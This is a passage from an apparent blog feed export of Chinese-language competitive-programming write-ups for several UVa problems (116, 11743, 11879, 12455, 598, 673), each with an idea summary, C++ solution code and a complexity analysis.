i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;s.size() ; j++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> k=i ; k&lt;=j ; k++)&#123;</span><br><span class="line">					dp[i][j]=max(dp[i][j], dp[i][k]+dp[k+<span class="number">1</span>][j]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[<span class="number">0</span>][s.size()<span class="number">-1</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>假設s.size()為N<br>共有 $N^2$ 種狀態，每種狀態轉移複雜度為 $O(N)$，總複雜度$O(N^3)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa116</title>
    <url>/2020/06/23/UVa116/</url>
    <content><![CDATA[<h1 id="UVa116"><a href="#UVa116" class="headerlink" title="UVa116"></a>UVa116</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?116" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?116</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>實作dfs很簡單，但是需要能回朔解<br>這邊想到用陣列去記錄每個點要前往的x座標，而y座標固定是+1，故不紀錄<br>在更新Min_dis要特別注意維護x較小的要在前<br>並且當Min_dis已經為最小值時DFS可以直接return減少遞迴時間</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m,n,arr[<span class="number">15</span>][<span class="number">105</span>],Min_dis[<span class="number">15</span>][<span class="number">105</span>],to[<span class="number">15</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">3</span>]=&#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x&lt;<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> m<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x&gt;=m)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y+<span class="number">1</span>==n)&#123;</span><br><span class="line">		<span class="keyword">return</span> Min_dis[x][y]=arr[x][y];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(Min_dis[x][y]!=<span class="number">2147483647</span>)</span><br><span class="line">		<span class="keyword">return</span> Min_dis[x][y];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> nx=next(x+dir[i]);</span><br><span class="line">		<span class="keyword">int</span> ny=y+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> dis=dfs(nx,ny);</span><br><span class="line">		<span class="keyword">if</span>(dis+arr[x][y]&lt;Min_dis[x][y])&#123;</span><br><span class="line">			Min_dis[x][y]=dis+arr[x][y];</span><br><span class="line">			to[x][y]=nx;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(dis+arr[x][y]==Min_dis[x][y] &amp;&amp; to[x][y]&gt;nx)&#123;</span><br><span class="line">			to[x][y]=nx;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Min_dis[x][y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n)&#123;</span><br><span class="line">		<span class="comment">//input</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">				Min_dis[i][j]=<span class="number">2147483647</span>;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>,tot=<span class="number">2147483647</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="keyword">int</span> res=dfs(i,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(res&lt;tot)&#123;</span><br><span class="line">				tot=res;</span><br><span class="line">				ans=i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> start=ans,j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(out)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				out=<span class="literal">true</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;start+<span class="number">1</span>;</span><br><span class="line">			start=to[start][j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;tot&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>每次狀態轉移複雜度為 $O(1)$，總共有$n\times m$ 種狀態<br>總複雜度 $O(nm)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11743</title>
    <url>/2020/07/02/UVa11743/</url>
    <content><![CDATA[<h1 id="UVa11743"><a href="#UVa11743" class="headerlink" title="UVa11743"></a>UVa11743</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11743" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11743</a><br>定義一組合法的信用卡卡號可以透過以下步驟檢查</p>
<ol>
<li>將偶數位置上的數字乘2</li>
<li>將剛剛所得到的數字中每一個位數數值加總</li>
<li>將信用卡號中奇數位數的數字作加總</li>
<li>將步驟2、3兩數相加</li>
<li>判斷個位數是否為0，0為合法卡號，非零為非法卡號</li>
</ol>
<p>給一組信用卡卡號，求是否為合法卡號</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>依據題目給的步驟模擬過一遍即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,tmp,odd,even;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(n)&#123;</span><br><span class="line">		ret+=n%<span class="number">10</span>;</span><br><span class="line">		n/=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		odd=<span class="number">0</span>,even=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			<span class="keyword">bool</span> is_odd=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">				<span class="keyword">if</span>(is_odd)</span><br><span class="line">					odd+=tmp%<span class="number">10</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					even+=add((tmp%<span class="number">10</span>)*<span class="number">2</span>);</span><br><span class="line">				tmp/=<span class="number">10</span>;</span><br><span class="line">				is_odd=!is_odd;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((odd+even)%<span class="number">10</span>!=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Invalid\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Valid\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>將數字 $t$ 的每位數字相加複雜度為 $O(len(t))$<br>而題目中的數字長度固定為16，故複雜度約為 $O(1)$<br>其餘操作皆為 $O(1)$<br>總複雜度 $O(1)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11879</title>
    <url>/2020/07/02/UVa11879/</url>
    <content><![CDATA[<h1 id="UVa11879"><a href="#UVa11879" class="headerlink" title="UVa11879"></a>UVa11879</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11879" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11879</a><br>給一數字 $N$ $(1 \leq N \leq 10^{100})$<br>求該數字是否為17的倍數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>不必理會題目中給的方式<br>可以直接模擬一次做除法的樣子<br><img src="https://i.imgur.com/YAUvlw8.png" alt=""><br>每次做除法就是加入一個位數，留下跟除數相除的餘數繼續步驟<br>如果做到最後餘數為0，則即為答案<br>數字部分可以用字串儲存</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> now=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)</span><br><span class="line">		now=(now*<span class="number">10</span>+(s[i]-<span class="string">'0'</span>))%<span class="number">17</span>;</span><br><span class="line">	<span class="keyword">return</span> now==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s &amp;&amp; s!=<span class="string">"0"</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(solve())</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"1\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"0\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>對於每個位數處理的時間複雜度為 $O(1)$<br>總時間複雜度為 $O(len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>string</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa12455</title>
    <url>/2020/06/25/UVa12455/</url>
    <content><![CDATA[<h1 id="UVa12455"><a href="#UVa12455" class="headerlink" title="UVa12455"></a>UVa12455</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?12455" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?12455</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個長度的棍子都可以用其他棍子組合而成<br>定義 $DP[i]$ 表示可以組成長度i的棍子<br>則有 $DP[i] = DP[i-k] ,k \leq i$<br>對於每個棍子都看看能不能透過這個棍子與其他棍子的組合組成新的長度</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,p,arr[<span class="number">1005</span>],dp[<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;p;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">1005</span> ; i++)dp[i]=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;p ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="comment">//dp[i]=dp[i-k], k&lt;=i</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;p ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=n ; j&gt;=arr[i] ; j--)&#123;</span><br><span class="line">				<span class="keyword">if</span>(dp[j-arr[i]])</span><br><span class="line">					dp[j]=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(dp[n])</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"YES\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"NO\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>共有n種狀態，每種狀態轉移複雜度為 $O(1)$<br>總複雜度為 $O(n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa598</title>
    <url>/2020/06/16/UVa598/</url>
    <content><![CDATA[<h1 id="UVa598"><a href="#UVa598" class="headerlink" title="UVa598"></a>UVa598</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?598" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?598</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>輸入比較麻煩，這邊用stringstream處理輸入<br>接下來做dfs暴力枚舉每個特定深度即可<br>要特別注意到的是，因為可以保證前面枚舉過的元素不會再出現<br>所以會枚舉到的只有當前點與其後的所有點<br>記錄前一次是取哪個點即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t;<span class="built_in">string</span> s,tmp;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; input;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; news;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; ans;</span><br><span class="line"><span class="keyword">bool</span> used[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span> size, <span class="keyword">int</span> last)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> i: ans)&#123;</span><br><span class="line">			<span class="keyword">if</span>(out)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">", "</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				out = <span class="literal">true</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=last ; i&lt;news.size() ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!used[i])&#123;</span><br><span class="line">			used[i]=<span class="literal">true</span>;</span><br><span class="line">			ans.push_back(news[i]);</span><br><span class="line">			dfs(depth<span class="number">-1</span>,size,i);</span><br><span class="line">			ans.pop_back();</span><br><span class="line">			used[i]=<span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	getline(<span class="built_in">cin</span>,s);getline(<span class="built_in">cin</span>,s);</span><br><span class="line">	<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(out)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			out=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		input.clear();</span><br><span class="line">		news.clear();</span><br><span class="line">		ans.clear();</span><br><span class="line">		<span class="built_in">memset</span>(used,<span class="keyword">sizeof</span>(used),<span class="literal">false</span>);</span><br><span class="line">		getline(<span class="built_in">cin</span>,s);</span><br><span class="line">		<span class="function"><span class="built_in">stringstream</span> <span class="title">ss</span><span class="params">(s)</span></span>;</span><br><span class="line">		<span class="keyword">while</span>(ss&gt;&gt;tmp)&#123;</span><br><span class="line">			input.push_back(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,s) &amp;&amp; (<span class="keyword">int</span>)(s[<span class="number">0</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">			news.push_back(s);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(input.size() == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(input[<span class="number">0</span>]==<span class="string">"*"</span>)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=news.size() ; i++)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;<span class="string">"Size "</span>&lt;&lt;i&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">					dfs(i,i,<span class="number">0</span>);</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">int</span> in0 = stoi(input[<span class="number">0</span>]);</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"Size "</span>&lt;&lt;in0&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">				dfs(in0,in0,<span class="number">0</span>);</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">int</span> in0=stoi(input[<span class="number">0</span>]);</span><br><span class="line">			<span class="keyword">int</span> in1=stoi(input[<span class="number">1</span>]);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=in0 ; i&lt;=in1 ; i++)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"Size "</span>&lt;&lt;i&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">				dfs(i,i,<span class="number">0</span>);</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><ul>
<li>輸入、預處理<br>  $O(N)$</li>
<li>DFS<br>  $O(N*(b-a))$<br>整體複雜度: $O(tN(b-a))$</li>
</ul>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa673</title>
    <url>/2020/09/11/UVa673/</url>
    <content><![CDATA[<h1 id="UVa673"><a href="#UVa673" class="headerlink" title="UVa673"></a>UVa673</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?673" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?673</a><br>給一個只包含 <code>(</code> <code>)</code> <code>[</code> <code>]</code> 的字串<br>定義合法的字串需要符合以下任一條件</p>
<ol>
<li>字串為空字串</li>
<li>如果 $A$ 和 $B$ 都為正確的運算式，則 $A B$ 也為正確的運算式，</li>
<li>如果 $A$ 為正確的運算式，則 $(A)$ 及 $[A]$ 都為正確的運算式。<br>求該字串是否為合法字串</li>
</ol>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果括號要能匹配的話，必定會兩者相鄰，例如 <code>()</code> 或是 <code>[]</code><br>那麼，我們只需要一找到匹配的括號就消除，最後如果還有剩餘就是不合法字串，否則為合法字串<br>利用<strong>stack</strong>的特性可以簡單地完成</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt;st;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		getline(<span class="built_in">cin</span>,s);</span><br><span class="line">		<span class="keyword">while</span>(!st.empty())</span><br><span class="line">			st.pop();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">'('</span> || s[i] == <span class="string">'['</span>)</span><br><span class="line">				st.push(s[i]);</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(st.empty())&#123;</span><br><span class="line">					st.push(s[i]);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(st.top()==<span class="string">'('</span> &amp;&amp; s[i]==<span class="string">')'</span>)&#123;</span><br><span class="line">					st.pop();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(st.top()==<span class="string">'['</span> &amp;&amp; s[i]==<span class="string">']'</span>)&#123;</span><br><span class="line">					st.pop();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					st.push(s[i]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(st.empty())</span><br><span class="line">			<span 